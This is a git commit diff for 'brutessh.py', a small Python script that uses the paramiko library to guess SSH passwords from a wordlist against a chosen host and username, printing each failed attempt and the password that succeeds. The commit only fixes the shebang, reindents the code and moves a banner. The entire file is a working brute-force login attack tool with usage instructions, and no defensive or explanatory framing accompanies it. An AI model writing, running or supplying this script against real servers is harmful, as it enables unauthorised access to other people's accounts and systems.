cb9b30f694027378b9d7ce61df025a845d63981c
theDerfel <42454150+theDerfel@users.noreply.github.com>
2023-03-29 23:57:42 -0300

    Update brutessh.py

--- brutessh.py
+++ brutessh.py
@@ -1,25 +1,25 @@
-!/usr/bin/python
+#!/usr/bin/python
 import paramiko, sys
+print("=== WELCOME TO SSH BRUTE FORCE! ===")
 try:
-        ip = sys.argv[1]
-        user = sys.argv[2]
-        wl = open(sys.argv[3], 'r')
-        client = paramiko.SSHClient()
-        client.load_system_host_keys()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        print("=== WELCOME TO SSH BRUTE FORCE! ===")
-        print("Host: ", ip)
-        print("User: ", user)
-        print("===================================")
-        for w in wl:
-                w = w.rstrip('\n')
-                try:
-                        client.connect(ip, username=user, password=w)
-                except paramiko.ssh_exception.AuthenticationException:
-                        print("[-] Testing --> " + w)
-                else:
-                        print("[+] CONNECTED --> " + w)
-                        break
+	ip = sys.argv[1]
+	user = sys.argv[2]
+	wl = open(sys.argv[3], 'r')
+	client = paramiko.SSHClient()
+	client.load_system_host_keys()
+	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	print("Host: ", ip)
+	print("User: ", user)
+	print("===================================")
+	for w in wl:
+		w = w.rstrip('\n')
+		try:
+			client.connect(ip, username=user, password=w)
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[-] Testing --> " + w)
+		else:
+			print("[+] CONNECTED --> " + w)
+			break
 except:
-        print("=== WELCOME TO SSH BRUTE FORCE! ===")
-        print('Usage: ./brutessh.py 127.0.0.1 user wordlist.txt')
+	print('ERROR!')
+	print('Usage: ./brutessh.py 127.0.0.1 user wordlist.txt')
